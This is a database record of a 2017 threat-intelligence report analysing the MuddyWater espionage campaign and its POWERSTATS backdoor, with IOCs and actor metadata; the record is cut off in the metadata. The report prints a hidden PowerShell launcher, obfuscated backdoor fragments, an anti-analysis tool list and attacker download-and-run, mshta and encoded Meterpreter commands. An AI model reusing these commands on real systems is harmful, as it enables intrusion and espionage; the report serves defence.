{
    "id": "5ceed825-17a4-42a7-b436-353d3b720ab6",
    "created_at": "2023-01-12T14:59:05.509427Z",
    "updated_at": "2025-03-27T02:17:27.713964Z",
    "deleted_at": null,
    "sha1_hash": "880d02146357a02e65406c3eb4279c9243641c7c",
    "title": "2017-11-22 - A dive into MuddyWater APT targeting Middle-East",
    "authors": "",
    "file_creation_date": "2022-05-28T17:57:10Z",
    "file_modification_date": "2022-05-28T17:57:10Z",
    "file_size": 1767982,
    "plain_text": "# A dive into MuddyWater APT targeting Middle-East\n\n**reaqta.com/2017/11/muddywater-apt-targeting-middle-east/**\n\nMuddyWater is a threat actor that caught our attention for their extensive use of “Living off the Land” attacks in a targeted\ncampaign aimed at the Middle East. During our investigation we reconstruct the evolution of the vectors used and how the\ngroup operates to target their victims, evade detections and move laterally inside the compromised infrastructures.\n\n## MuddyWater Summary\n\nMuddyWater is an APT group that has been active throughout 2017, targeting victims in Middle East with in-memory\nvectors leveraging on Powershell, in a family of attacks now identified as “Living off the land”, as they don’t require the\ncreation of new binaries on the victim’s machine, thus maintaining a low detection profile and a low forensic footprint.\n\n[The name MuddyWater has been assigned by PaloAlto in an article that describes how the actor’s backdoor,](https://researchcenter.paloaltonetworks.com/2017/11/unit42-muddying-the-water-targeted-attacks-in-the-middle-east/)\ncalled POWERSTATS, evolved over the past year. For the sake of clarity we decided to maintain the same names.\n\nThe operators behind MuddyWater are likely espionage motivated, we derive this information from the analysis of data and\nbackdoors behaviors. We also find that despite the strong preponderance of victims from Pakistan, the most active targets\nappear to be in: Saudi Arabia, UAE and Iraq. Amongst the victims we identify a variety of entities with a stronger focus at\n**Governments, Telcos and Oil companies.**\n\nBy tracking the operations we finally figure out that the originating country is likely to be Iran, while it remains harder to\nascertain whether MuddyWater is state sponsored or a criminal organization incline to espionage.\n\nFinally we show how the threat evolved since its first public report, the techniques used and how the actors adapted to\nvarious public reports of their activities.\n\n## Timeline\n\nIn order to understand how the threat evolved and to understand the whole picture, we have to reconstruct the timeline of\nthe various discoveries and piece together the findings published.\n\n**18/Sep/2017 – First public report**\n\nTo the best of our knowledge the first public report of this specific threat came from our intelligence team (please let us\nknow if any prior finding was published before) with the first detection happening during the second half of September. At\n[that time the analysis from ReaQta-Hive shows the full threat’s behavior and the C2 address is disclosed to be:](https://upstream.rqt.io/hive/)\n**144.76.109.88. At this stage the malware uses GitHub to conceal and download its payload.**\n\nShortly after the information is made public, GitHub blocks the account and MuddyWater’s operators quickly shift to\n**Pastebin as their main repository.**\n\n\n-----\n\nLiving off the land RAT downloads 1st stage from cloned fb/react repo, persists in registry & task, uses breached\n[websites as c&c pic.twitter.com/hqwLmIKHXW](https://t.co/hqwLmIKHXW)\n\n[— ReaQta (@ReaQta) September 18, 2017](https://twitter.com/ReaQta/status/909799626730901504?ref_src=twsrc%5Etfw)\n\n**26/Sep/2017 – First public analysis**\n\n[At the end of September, MalwareBytes publishes an analysis of POWERSTATS, showing how the threat is now](https://blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabia-government_entity/)\ndownloading its payload from Pastebin. With the exception of the repository location, we confirm that the behavior of the\nanalyzed backdoor is the same as the one identified by ReaQta a few days earlier, an important piece of the puzzle as it\nshows that MuddyWater is an active and adaptive threat that targets victims for espionage purposes. The disclosed C2\naddress is: 144.76.109.88.\n\nOn the same day the analysis is published, MuddyWater operators switch their infrastructure to a new C2 address that\nbecomes: 148.251.204.131.\n\n**3/Oct/2017 – MuddyWater starts to embed the payload**\n\nAs part of the evolution of POWERSTATS, for the first time on the 3rd of October we notice that the payload is not\ndownloaded anymore from a remote source (GitHub or Pastebin) but it comes embedded in the vector itself while the C2\nremains the same: 148.251.204.131.\n\n**11/Nov/2017 – New C2 for the active backdoors**\n\nThe 11th of November the C2 address is switched again and changed to: 78.129.139.147 (this is the first public disclosure\nof the address).\n\n**14/Nov/2017 – Second public analysis**\n\nPalo Alto publishes the analysis mentioned in the summary, reconstructing the timeline and taking the date of the first\ninfection back to February 2017, while also showing how the operators adapted the backdoor to reduce the detection rate\nand to thwart analyses. Palo Alto reports the C2 to be the same as identified by MalwareBytes (148.251.204.131) although\nfrom our end we see a different picture as all the implants are already communicating with the C2 discovered on the 11th\nof November (78.129.139.147).\nFollowing the publication of the analysis, we noticed a drop in activity from all the implants that were still communicating\nwith the old C2 address from October.\n\n**20/Nov/2017 – New C2 and JScript RAT (Koadic) / Meterpreter**\n\n[After the National CyberSecurity Center from Saudi Arabia publishes an advisory (the link appears to be unreachable from](https://www.moi.gov.sa/wps/portal/ncsc/home/Alerts/!ut/p/z1/04_Sj9CPykssy0xPLMnMz0vMAfIjo8ziDQ1dLDyM3A18_M29XQwcnQKD3UyN3Y0dfQ30w8EKDDxNTDwMTYy8_YMMDAwcjcM8PIwtnA0N3I31o4jRj0cBSL8BDuBI0H4j4uzHYwFB_VEQJ-JxASE_FOSGhoZGGGQCALbSJYo!/dz/d5/L0lDUmlTUSEhL3dHa0FKRnNBLzROV3FpQSEhL2Fy/)\n[outside Middle East, but a copy can be found here) regarding the espionage activity by MuddyWater, the attacker](https://web.archive.org/web/20171120210331/https://www.moi.gov.sa/wps/portal/ncsc/home/Alerts/!ut/p/z1/04_Sj9CPykssy0xPLMnMz0vMAfIjo8ziDQ1dLDyM3A18_M29XQwcnQKD3UyN3Y0dfQ30w8EKDDxNTDwMTYy8_YMMDAwcjcM8PIwtnA0N3I31o4jRj0cBSL8BDuBI0H4j4uzHYwFB_VEQJ-JxASE_FOSGhoZGGGQCALbSJYo!/dz/d5/L0lDUmlTUSEhL3dHa0FKRnNBLzROV3FpQSEhL2Fy/)\ndeployed on some of the victims two different types of backdoors:\n\n1. JScript RAT known as [Koadic, publicly available on GitHub, communicating with C2: 88.99.17.148](https://github.com/zerosum0x0/koadic)\n2. Meterpreter communicating with C2: 78.129.139.147\n\n\n-----\n\nMuddyWater attacks timeline\n\n\n## Operations\n\n\n-----\n\nMuddyWater operators use a series of compromised websites that act as proxies in order to conceal the real address of\nthe C2 server. Infected endpoints connect randomly to one of the proxy servers, which in turn relays the information to the\nC2. Operators use the C2 to dispatch commands and receive exfiltrated data.\n\nInfrastructure\nThe exception to the rule is represented by the Koadic part that bypasses the proxies and communicates directly with the\nC2 server.\n\nMuddyWater operators have been capable of consistently infecting new computers, this is clearly shown by the graph\nbelow showing the growth trend of victims when the group was still moving relatively under the radar, at least in Middle\nEast.\n\n\n-----\n\nDaily trend of new infections\nAnother interesting part of the data is represented by the aggregate activity of each backdoor, show below.\n\nOverall activity of all infected victims (click to zoom)\nIt is interesting to note what is the impact of public analyses and advisories on a large scale espionage campaign and how\nfast MuddyWater adapts to each new disclosure. It is also possible to understand the working patterns of the operators, at\nleast up to the 12th of November when they were operating relatively undisturbed.\n\n\n-----\n\nHourly activities (cilck to zoom)\nZooming in on the victims, we can understand on which countries the group has been focusing with most infections in the\nEU belonging to victims travelling.\n\nUnique victims per country\n\nbefore the publication of advisories in Middle East, countries with less than 5 victims are not shown (Tunisia, Lebanon,\nJordan, Israel, Egypt),\nAt a first glance Pakistan is the targeted country but our data reveals a different picture. By analyzing the activity on each\nvictim we realized that the operators were interested in a different area.\n\n\n-----\n\nOperators activities per country\nPakistan is indeed the country with the most infections, though the operators appears to be relatively disinterested in those\nvictims. On the other hand, Iraq has a large number of infections and the operators are extremely active on those\ninfrastructures. Saudi Arabia and United Arab Emirates (Dubai specifically) have a low number of victims, all of them\nextremely active. This led us to believe that the real targets are then: Iraq, Saudi Arabia and UAE.\n\n### Targets\n\nVictims belong to a variety of different sectors but the MuddyWater operators are particularly active on Governments,\n**Telcos and Oil companies (including one Oil platform). In one instance we found that a large Iraqi telecom provider was**\ndeeply compromised with 10% of their endpoints infected with POWERSTATS. The attackers also possess some decent\ncapabilities of lateral movement and they rely on various exploits, LPE – fully working up to the latest version of Windows\n10 – and tools (some publicly available) to get access to the endpoints of interest once inside the infrastructure.\n\n\n-----\n\nDistribution of infected Operating Systems\nWhile 85% of infected devices are workstations, the remaining 15% is made by servers, indicating that the attackers are\ncapable of escalating after the initial breach to get direct access to the data they’re interested to.\n\n**Decoy Documents**\n\nThe initial backdoor is deployed using a decoy document containing a macro. Here are some examples of the content\ndelivered to the victims:\n\n\n-----\n\nThe observed content has some common characteristics like the attempt to impersonate National entities; the four\ndocuments mimics:\n\nIraqi National Intelligence Service\nNational Security Agency\nMinistry of Interior of Saudi Arabia\nFederal Investigation Agency Ministry Of Interior Pakistan\n\nEvery document also presents an Input Box and a Button at the bottom of the page.\n\n**Document Analysis**\n\nBeside the decoy content, the static analysis of the initial documents allowed us to identify some common characteristics.\nAll documents leverages the Macro VBS mechanism to execute code and deploy next attack stages.\n\nSample 1\n\nSHA256: 2c8d18f03b6624fa38cae0141b91932ba9dc1221ec5cf7f841a2f7e31685e6a1\n\n\n-----\n\nSample 1 Metadata\n\nSample 2\n\nSHA256: 40a6b4c6746e37d0c5ecb801e7656c9941f4839f94d8f4cd61eaf2b812feaabe\n\n\n-----\n\nSample 2 Metadata\n\nBoth documents has the following common metadata fields:\n\nLastModifiedBy: GIGABYTE\nAppVersion: 15.0\nSoftware: Microsoft Office Word\n\nIn particular all but one document’s metadata show that the author’s keyboard locale was set to ar_SA (Arabic, Saudi\nArabia).\nThe macro operations can be summarized as follow:\n\nDecode and drop a powershell script into C:\\Users\\Public\\Documents\\system.ps1\nDecode and drop a VBS script into C:\\Users\\Public\\Documents\\system.vbs\nExecutes the VBS with [Shell.Open Method](https://msdn.microsoft.com/en-us/library/windows/desktop/bb774086(v=vs.85).aspx?cs-save-lang=1&cs-lang=vb#code-snippet-1)\n\nThe VBS content is below reported and its scope is to simply run system.ps1 powershell script.\n```\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\ncommand = \"powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -file\nC:\\Users\\Public\\Documents\\system.ps1\"\nobjShell.Run command,0\nSet objShell = Nothing\n\n```\n**Powershell Backdoor**\n\n\n-----\n\nStarting from system.ps1 the attack chain goes through two blocks of code that prepare the ground for the third block of\ncode, containing the real powershell backdoor. Each block sets the variables necessary for the correct execution of the\nbackdoor. Since the entire content is quite large we summarized the overall structure as follows:\n```\n# First Block\n&((GEt-VARIAbLE '*MDR*').nAme[3,11,2]-JOiN'') (\" $( sV 'Ofs' '')\"+[stRinG](( 100000, [...]\n# Second Block\n&( $pShOme[21]+$psHOME[34]+'x') ([stRIng]::JOin( '', ('100000 [...]\n# Third Block/Backdoor\n. ( $ShELlID[1]+$shelLiD[13]+'x') ( ( '1100110 [...]\n\n```\n[We can observe 3 blocks of code that seems to be obfuscated with using Invoke-Obfuscation.](https://twitter.com/danielhbohannon/status/928688221885747205)\nEach block presents this structure:\n```\niex | (code)\n\n```\n**First Block**\nAfter the deobfuscation, the first block sets the following variables:\n\nFirst Block Variables\n\n**Second Block**\nThe second block like the first one after being deobfuscated, creates additional local variables, environment variables and\nfunctions used by the backdoor:\n\nSecond Block Variables\n\nSecond Block Functions\n\n**Third Block/Backdoor**\nThe third and final block is the backdoor and it’s responsible for:\n\nAnti-Analysis Countermeasures\n\n\n-----\n\nPersistence\nVictim registration\nNetwork communications\nCommand Execution\n\nThe whole backdoor’s structure is quite simple simple and appears as follows:\n\nThird Block/Backdoor\n\nFor the sake of brevity we will report only the most interesting functions.\nThe backdoor implements an anti-analysis countermeasure that uses isDebugEnv to shutdown the machine if one of the\nfollowing tools is found to be running:\n\n\n-----\n\n```\n  y g\nProcessHacker\ntcpview\nautoruns\nautorunsc\nfilemon\nprocmon\nregmon\nprocexp\nidaq\nidaq64\nImmunityDebugger\nWireshark\ndumpcap\nHookExplorer\nImportREC\nPETools\nLordPE\ndumpcap\nSysInspector\nproc_analyzer\nsysAnalyzer\nsniff_hit\nwindbg\njoeboxcontrol\njoeboxserver\n\n```\nDuring the analysis, our victims received an updated version of isDebugEnv which extends the list to the following tools\ntoo:\n```\nwin32_remote\nwin64_remote64\n\n```\nThe function persistence takes care of lowering the security settings of Microsoft Excel and Word, creating a survival on\nreboot mechanism and hiding the VBS and PS1 by setting the file attributes System and Hidden via the Windows utility\n_attrib.exe._\nPersistence is obtained by adding an entry into (HKCU and HKLM) CurrentVersion\\Run. The final artifact will have a\nvalue named Windows Optimizations which resolves to: Wscript C:\\Users\\Public\\Documents\\System.Vbs. An second\npersistence is obtained by adding a Scheduled Task entry called Microsoft\\WindowsOptimizationsService which\nexecutes Wscript C:\\Users\\Public\\Documents\\System.Vbs.\n\nfunction persist()\n\n[The entire function and the system’s alterations can be easily summarized by checking the events in ReaQta-Hive:](https://upstream.rqt.io/hive/)\n\n\n-----\n\nReaQta-Hive Events\n\nOn the next step the script looks for *.dat files, if none is found it sleeps up to one hour and then stores the proxy URL in\nthe registry and awaits until the function getKey() succeeds.\n\nThe getKey() function retrieves a key that uniquely identifies the victim’s machine, if it does not exists it invokes the\n**register function. Registration is performed by collecting information about the running OS that will be sent to the attacker,**\nthe server will finally reply with a unique key (MD5) stored in {username}.dat. By diving more in depth in the register\nfunction we can see that it gathers IP, OS ad User’s information, finally assembling the following string:\n```\n$($env:computername)~~$($env:username)~~$os~~$($ips.subString(1))~~$((Get-WmiObject\nWin32_ComputerSystem).Domain)\n\n```\nAfter the UniqueKey handling (Created or Found) stage the backdoor enters in the Main Loop that calls the\n**getCommand() function. This function requests commands to the C2 and sends back the results by splitting them in**\nchucks.\n\nThe command evaluation is performed by using Invoke-Expression from powershell, such approach is simple and\nstraightforward and it offers strong post-exploitation capabilities to the attacker, the scripts can now run as a remote\npowershell.\n\n**Additional persistence method**\n\nWe identified an additional persistence method deployed by the attacker, the technique relies on using a Word Template\n[and it’s been described at length in the article “Maintaining Access with Normal.dotm”](https://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/)\n\nPowershell script that create\n\nthe Normal.dotm file Macro\n\nfrom Normal.dotm\n\n**Connections and Similarities between samples**\n\nDuring the investigation we noticed that this attack generated an incident quite similar to another one we already observed\nin the [past. As we can see from the following screenshots the two process-tree are almost the same:](https://twitter.com/ReaQta/status/909799626730901504)\n\n\n-----\n\nBehavioral-Tree view of Old\n\nand New incidents\nThe core differences between the two attacks can be summarized as follows:\n\nMacro and Powershell script are now obfuscated\nBackdoor code has been refactored\nURL parameters are changed\n\nAdditionally the code of the backdoor has been refactored, as it can be seen from the following examples.\n\n_function httpGet_\n\nThe new version adds a fallback URL to contact, in both cases domains are randomly chosen from an hard-coded list.\n\nhttpGet diff\n\nThe “send” code has been moved into a dedicated new function:\n\nsend code diff\n\n_function persistence_\n\nThe persistence is obtained by using the same techniques and names as before, with the exception of the scheduled-task\nentry name that changes as follows:\n```\nWindowsOptimizations -> Microsoft\\WindowsOptimizationsService\n\n```\n**CurrentVersion\\Run Persistence**\n\nDifferences between Old and\n\nNew CurrentVersion\\Run\n**Scheduled Task Persistence**\n\n\n-----\n\nDifferences between Old and\n\nNew Scheduled Task\n\n**MuddyWater Communication**\n\nCommunication with the C2 happens through compromised websites working as proxies, as explained above. Here it is a\npartial list of the proxies adopted by the backdoor:\n\nProxy List\n\nAs it can be seen from the above image, every request is performed via GET:\n```\nhttp://[COMPROMISED_SITE]/[MALICIOUS].php?c=Base64(CustomEncoding([DATA]))\n\n```\nBackdoor’s interactions with the attacker can be synthesized in two main steps:\n\nUniqueKey Handling (Registration/UniqueKey Update)\nCommand Exchange\n\nRegistration (already explained in depth) uses the following URL parameters:\n```\nBase64(CustomEncoding(a=r&b=[REGISTRATION_DETAILS]))\n\n```\nThe final result from a network point of view is:\n\nregistration\n\nCommand Exchange happens through the function getCommand.\n\nThe Backdoors can request a command to the attacker using the $id which is the UniqueKey:\n\n\n-----\n\n```\n    ( g( g ))\n\n```\nThe attacker replies as follows:\n```\nBase64(CustomEncoding($cmdID~~$cmd))\n\n```\nOnce the backdoor executes the command $cmd, it replies back to the attacker with the result:\n```\nBase64(CustomEncoding(a=s&i=$id&ch=last&ci=$cmdId&r=$result))\n\n```\nDepending on the length of the result, the reply to the attacker can be divided in chunks.\nThis is an extract of commands received directly from the attacker:\n```\n781~~Remove-itemproperty -path HKCU:\\Software\\Classes\\exefile\\shell\\runas\\command -name IsolatedCommand -Force\n791~~powershell -nop -w hidden -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://www.\n[REDACTED]/sh.txt')\"\n\n```\nAs we can see from the last command, the attacker sent a new powershell script:\n\npowershell script sh.txt\n\nWhose scope was to update the backdoor:\n\nNew C2 address\nNew isDebugEnv function\nNew proxy list (reported below)\n\n\n-----\n\nOld vs New Proxy List\n\nIn another session we received other commands whose scope was to try other backdoors:\n\nKoadic JScript RAT:\n```\n821~~mshta http://[REDACTED].38:9999/PcWuI\n825~~whoami\n\n```\nKoadic JScript RAT:\n```\n826~~mshta http://[REDACTED].134:9999/RBzUs\n\n```\n[Meterpreter injected using to_mem_pshreflection.ps1.template](https://github.com/rapid7/rex-powershell/blob/master/data/templates/to_mem_pshreflection.ps1.template)\n```\n829~~powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAk[...]\n\n```\nKoadic JScript RAT:\n```\n836~~mshta http://[REDACTED].148:9999/tTsjX\n\n```\n**MuddyWater Attribution**\n\nAs usual attribution of cyber espionage operations is a very complex topic and we don’t have definitive elements to make\nconclusions, that said during our investigation we noticed what might have been a mistake from one of the operators and\nfor a while we were able to track his/her movements. The IP address was in Tehran, Iran and we have reason to believe\nthat, in that specific instance, we were dealing with a final IP address and not a proxy, or a victim used to conceal the real\naddress. Other elements provide circumstantial evidence that the attacks can reasonably originate from Iran like the kind\n(and more specifically the identities) of the victims most investigated by the operators and their geographic distribution.\n\nDespite the origin of MuddWater’s attacks, a lot of doubts remain, the first of them is whether the group is state-sponsored\nor part of the organized crime. The relatively low sophistication of the attacks and the general handling of their\ninfrastructure led us to think about a criminal group, but the choice of victims and their agility once inside the compromised\ninfrastructures made us think about a more structured entity (possibly made by two different groups, one for attacks and\n\n\n-----\n\nanother one specialized in post exploitation activities). The second is about their link with APT33/OilRig, there are\ndifferent similarities in the techniques adopted by MuddyWater and APT33/OilRig but whether the operations belong to the\nsame actor is still unknown.\n\n**Conclusions**\n\n[Our customers running ReaQta-Hive are already protected and no further action is required. We suggest to check for all](https://upstream.rqt.io/hive/)\nthe published IOCs in order to understand whether the current backdoors are active and to check for signs of persistence\ndescribed above.\n\n**Appendix – IOCs**\n\n**Documents**\n\n40a6b4c6746e37d0c5ecb801e7656c9941f4839f94d8f4cd61eaf2b812feaabe\n588cd0fe3ae6fbd2fa4cf8de8db8ae2069ea62c9eaa6854caedf45045780661f\n917a6c816684f22934e2998f43633179e14dcc2e609c6931dd2fc36098c48028\na6673c6d52dd5361afd96f8143b88810812daa97004f69661da625aaaba9363b\nde6ce9b75f4523a5b235f90fa00027be5920c97a972ad6cb2311953446c81e1d\n2c8d18f03b6624fa38cae0141b91932ba9dc1221ec5cf7f841a2f7e31685e6a1\n\n**C2**\n\nhttp://148[.]251[.]204[.]131:8060 **Powerstats**\n\nhttp://78[.]129[.]139[.]147:8060 **Powerstats**\n\nhttp://104[.]237[.]233[.]38:9999 **Koadic**\n\nhttps://78[.]129[.]139[.]134:6643 **Meterpreter**\n\nhttp://78[.]129[.]139[.]134:9999 **Koadic**\n\nhttp://88[.]99[.]17[.]148:9999 **Koadic**\n\n**Powerstats and vbs launcher hashes**\n\n4121db476b66241610985350b825b9f1680d0171ab01a52b5ffcb56481521e44 _C:\\Users\\Public\\Documents\\NTSTATS.ps1_\n\na0abec361411cb11e01337939013bad1f54ad5865c73604a1b360d68ddfbd96a _C:\\Users\\Public\\Documents\\NTSTATS.vbs_\n\nb2c10621c9c901f0f692cae0306baa840105231f35e6ec36e41b88eebd46df4c _C:\\Users\\Public\\Documents\\system.ps1_\n\n16bcb6cc38347a722bb7682799e9d9da40788e3ca15f29e46b475efe869d0a04 _C:\\Users\\Public\\Documents\\system.vbs_\n\n**Powerstats Proxy URLs**\n\nhttp://106[.]187[.]38[.]21/short_qr/work[.]php?c=\nhttp://arbiogaz[.]com/upload/work[.]php?c=\nhttp://arch-tech[.]net/components/com_layer_slider/Senditem[.]php?c=\nhttp://azmwn[.]suliparwarda[.]com/wp-content/plugins/wpdatatables/panda[.]php?c=\nhttp://azmwn[.]suliparwarda[.]com/wp-content/themes/twentyfifteen/logs[.]php?c=\nhttp://bangortalk[.]org[.]uk/speakers[.]php?c=\nhttp://best2[.]thebestconference[.]org/ccb/browse_cat[.]php?c=\nhttp://bikekaidee[.]com/admin/404[.]php?c=\nhttp://camco[.]com[.]pk/Controls/data[.]aspx?c=\nhttp://cgss[.]com[.]pk/data[.]aspx?c=\nhttp://feribschat[.]eu/logs[.]php?c=\nhttp://fifacare55[.]com/404[.]php?c=\nhttp://ghanaconsulate[.]com[.]pk/data[.]aspx?c=\nhttp://heartmade[ ]ae/plugins/content/contact/Senditem[ ]php?c=\n\n\n-----\n\nhttp://itcdubai[.]net/action/contact_gtc[.]php?c\nhttp://kale[.]alfa-bilisim[.]com/Content/data[.]aspx?c=\nhttp://kale[.]alfa-bilisim[.]com/banka/3d/data[.]aspx?c=\nhttp://larsson-elevator[.]com/plugins/xmap/com_k2/com[.]php?c=\nhttp://magical-energy[.]com/css[.]aspx?c=\nhttp://magical-energy[.]com/css/css[.]aspx?c=\nhttp://mainandstrand[.]com/work[.]php?c=\nhttp://ohofifa[.]com/wp-content/themes/Newspaper/mobile/includes/404[.]php?c=\nhttp://ohofifa[.]com/wp-content/themes/Newspaper/mobile/work[.]php?c=\nhttp://projac[.]co[.]uk/Senditem[.]php?c=\nhttp://romix-group[.]com/modules/mod_wrapper/Senditem[.]php?c=\nhttp://school[.]suliparwarda[.]com/components/com_akeeba/work[.]php?c=\nhttp://school[.]suliparwarda[.]com/plugins/editors/codemirror/work[.]php?c=\nhttp://suliparwarda[.]com/wp-content/plugins/entry-views/work[.]php?c=\nhttp://suliparwarda[.]com/wp-content/themes/twentyfifteen/work[.]php?c=\nhttp://taxconsultantsdubai[.]ae/wp-content/themes/config[.]php?c=\nhttp://teeyaipakin[.]com/wp-content/plugins/all-in-one-seo-pack/404[.]php?c=\nhttp://tmclub[.]eu/clubdata[.]php?c=\nhttp://watyanagr[.]nfe[.]go[.]th/e-office/lib/work[.]php?c=\nhttp://watyanagr[.]nfe[.]go[.]th/watyanagr/power[.]php?c=\nhttp://whiver[.]in/power[.]php?c=\nhttp://www[.]4seasonrentacar[.]com/viewsure/data[.]aspx?c=\nhttp://www[.]akhtaredanesh[.]com/d/file/sym/work[.]php?c=\nhttp://www[.]akhtaredanesh[.]com/d/oschool/power[.]php?c=\nhttp://www[.]amarsarkar[.]com/webadmin/404[.]php?c=\nhttp://www[.]amarsarkar[.]com/webadmin/inc/404[.]php?c=\nhttp://www[.]arcadecreative[.]com/work[.]php?c=\nhttp://www[.]armaholic[.]com/list[.]php?c=\nhttp://www[.]asan-max[.]com/files/articles/css[.]aspx?c=\nhttp://www[.]asan-max[.]com/files/articles/large/css[.]aspx?c=\nhttp://www[.]autotrans[.]hr/index[.]php?c=\nhttp://www[.]dafc[.]co[.]uk/news[.]php?c=\nhttp://www[.]eapa[.]org/asphalt[.]php?c=\nhttp://www[.]elev8tor[.]com/show-work[.]php?c=\nhttp://www[.]jdarchs[.]com/work[.]php?c=\nhttp://www[.]kunkrooann[.]com/inc/work[.]php?c=\nhttp://www[.]mackellarscreenworks[.]com/work[.]php?c=\nhttp://www[.]mitegen[.]com/mic_catalog[.]php?c=\nhttp://www[.]nigelwhitfield[.]com/v2/work[.]php?c=\nhttp://www[.]pomegranates[.]org/index[.]php?c=\nhttp://www[.]ridefox[.]com/content[.]php?c=\nhttp://www[.]shapingtomorrowsworld[.]org/category[.]php?c=\nhttp://www[.]vanessajackson[.]co[.]uk/work[.]php?c=\nhttp://www[.]wmg-global[.]com/wp-content/wp_fast_cache/wmg-global[.]com/Senditem[.]php?c=\nhttp://www[.]yaran[.]co//wp-content/plugins/so-masonry/logs[.]php?c=\nhttp://www[.]yaran[.]co/wp-includes/widgets/logs[.]php?c=\nhttp://www[.]ztm[.]waw[.]pl/pop[.]php?c=\nhttps://coa[.]inducks[.]org/publication[.]php?c=\nhttps://mhtevents[.]com/account[.]php?c=\nhttps://skepticalscience[.]com/graphics[.]php?c=\nhttps://wallpapercase[.]com/wp-content/themes/twentyfifteen/logs[.]php?c=\nhttps://wallpapercase[.]com/wp-includes/customize/logs[.]php?c=\nhttps://www[.]spearhead-training[.]com//html/power[.]php?c=\nhttps://www[.]spearhead-training[.]com/action/point2[.]php?c=\nhttps://www[.]spearhead-training[.]com/work[.]php?c=\n\n\n-----\n\n**UAC Bypass scripts**\n\nc8fa6056145ce2662d673593faa8162734eefa04ec9a51f6d94e8df8a0c5675b _uac2.ps1_\n\nfe27abcbad72ede7fd668cfe2f9938d42248133b0aa068c9196a4766eaffc18e _uac.ps1_\n\ne5a60c8f90e846fe22b3b0ec3675038d214cacd1564d6d2b1add9b9c54bc601b _C:\\Users\\Public\\mobilink.js_\n\n1206ae0a9dd740e5c14ce842d9a93829cfe0db6f5bb8d8cf164f6d0abcb3541d _C:\\Users\\Public\\mobilink.js_\n\n**Normal.dotm powershell script**\n\n9c5404db9652b3862e40ba0642b05030eef4d896e30c497be5aa4073974e1c08 UuiBYgfG.ps1\n\n**Koadic JScript RAT**\n\na71c7451934830c6796dff4a937811aaf0dd519b756ff99b3e66d91a049ca801 _tTsjX_\n\n**Persistence Artifacts**\n\nRegistry – HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run – Key “Windows Optimizations” – Value\n_“wscript [maliciuous].vbs”_\nRegistry – HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run – Key: “Windows Optimizations” –\nValue:“wscript [maliciuous].vbs”\nScheduled Task – Name: Microsoft\\WindowsOptimizationsService – Action: “wscript [maliciuous].vbs”\nWord Template – Path: c:\\users\\{user}\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\ne22f21d486631d813c4ad77b1c106c621ec95bf002c19f4cb979312f198266f5\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-11-22 - A dive into MuddyWater APT targeting Middle-East.pdf"
    ],
    "report_names": [
        "2017-11-22 - A dive into MuddyWater APT targeting Middle-East.pdf"
    ],
    "threat_actors": [
        {
            "id": "2ed8d590-defa-4873-b2de-b75c9b30931e",
            "created_at": "2023-01-06T13:46:38.730137Z",
            "updated_at": "2025-03-27T02:00:02.903261Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "Boggy Serpens",
                "Mango Sandstorm",
                "TEMP.Zagros",
                "Static Kitten",
                "G0069",
                "TA450",
                "Earth Vetala",
                "Seedworm",
                "COBALT ULSTER",
                "ATK51"
            ],
            "source_name": "MISPGALAXY:MuddyWater",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5a0483f5-09b3-4673-bb5a-56d41eaf91ed",
            "created_at": "2023-01-06T13:46:38.814104Z",
            "updated_at": "2025-03-27T02:00:02.925972Z",
            "deleted_at": null,
            "main_name": "MageCart",
            "aliases": [],
            "source_name": "MISPGALAXY:MageCart",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "cffb3c01-038f-4527-9cfd-57ad5a035c22",
            "created_at": "2022-10-25T15:50:23.38055Z",
            "updated_at": "2025-03-27T02:00:55.459558Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "COBALT GYPSY",
                "IRN2",
                "APT34",
                "Helix Kitten",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "EUROPIUM",
                "ITG13"
            ],
            "source_name": "MITRE:OilRig",
            "tools": [
                "ISMInjector",
                "RDAT",
                "Systeminfo",
                "QUADAGENT",
                "OopsIE",
                "Tasklist",
                "certutil",
                "ZeroCleare",
                "POWRUNER",
                "netstat",
                "ipconfig",
                "LaZagne",
                "BONDUPDATER",
                "SideTwist",
                "PsExec",
                "SEASHARPEE",
                "Mimikatz",
                "RGDoor",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67709937-2186-4a32-b64c-a5693d40ac77",
            "created_at": "2023-01-06T13:46:38.495593Z",
            "updated_at": "2025-03-27T02:00:02.848206Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "IRN2",
                "Hazel Sandstorm",
                "EUROPIUM",
                "TA452",
                "Earth Simnavaz",
                "Cobalt Gypsy",
                "Crambus",
                "Helix Kitten",
                "APT 34",
                "APT34",
                "ATK40",
                "G0049",
                "Evasive Serpens",
                "Twisted Kitten"
            ],
            "source_name": "MISPGALAXY:OilRig",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b23e717c-0b27-47e0-b3c8-4defe6dd857f",
            "created_at": "2023-01-06T13:46:38.367369Z",
            "updated_at": "2025-03-27T02:00:02.815758Z",
            "deleted_at": null,
            "main_name": "APT33",
            "aliases": [
                "ATK35",
                "Peach Sandstorm",
                "TA451",
                "APT 33",
                "Elfin",
                "Refined Kitten",
                "MAGNALLIUM",
                "HOLMIUM",
                "COBALT TRINITY",
